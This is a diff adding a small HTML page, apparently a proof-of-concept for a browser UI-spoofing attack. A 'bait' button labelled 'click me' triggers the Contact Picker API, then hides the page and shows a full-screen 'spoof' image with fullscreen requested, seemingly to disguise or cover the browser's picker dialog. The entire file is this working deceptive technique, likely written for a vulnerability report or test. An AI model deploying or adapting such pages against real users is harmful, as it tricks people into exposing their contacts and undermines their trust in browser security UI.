@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, user-scalable=no"
+    />
+    <title>tester</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        background: #fff;
+        text-align: center;
+        font-family: sans-serif;
+      }
+      #spoof {
+        display: none;
+        width: 100vw;
+        height: 100vh;
+        object-fit: cover;
+      }
+      #bait {
+        margin-top: 30vh;
+      }
+      button {
+        padding: 15px 30px;
+        font-size: 18px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <img id="spoof" src="spoof.png" alt="spoof" />
+
+    <div id="bait">
+      <h2>click button bellow</h2>
+      <button id="btn">click me</button>
+    </div>
+
+    <script>
+      document.getElementById("btn").addEventListener("click", () => {
+        navigator.contacts.select(["name"]).catch(() => {});
+
+        document.getElementById("bait").style.display = "none";
+        document.getElementById("spoof").style.display = "block";
+
+        document.documentElement.requestFullscreen().catch(() => {});
+      });
+    </script>
+  </body>
+</html>
